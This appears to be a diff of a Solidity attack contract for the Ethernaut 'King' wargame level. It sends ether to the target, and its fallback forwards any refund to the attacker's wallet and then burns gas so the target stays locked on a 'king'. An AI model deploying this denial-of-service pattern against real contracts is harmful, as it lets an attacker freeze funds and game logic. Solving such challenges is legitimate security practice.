@@ -1,28 +1,29 @@
 pragma solidity ^0.4.24;
 
-import '../installed_contracts/zeppelin/contracts/ownership/Ownable.sol';
-
-contract King is Ownable {
-  function() external payable {
-  }
-}
+import "zeppelin/contracts/ownership/Ownable.sol";
+import "levels/King.sol";
 
 contract KingHack {
     address public level;
     address public mywallet;
+    King    public target;
+
     event log(uint256 indexed val);
     
     constructor(address _inst) public {
-        level = _inst;
-        King(level).send(1);
-        mywallet = msg.sender;
+        target = King(_inst);
     }
     
-    function () payable {
-        mywallet.send(msg.value);
+    function attack() public {
+        target.transfer(1);
+        mywallet = msg.sender;
+    }
+
+    function () public payable {
+        mywallet.transfer(msg.value);
         
         // waste gasleft
         for(uint i = 0; i < 1000; i++)
-            log(i);
+            emit log(i);
     }
 }
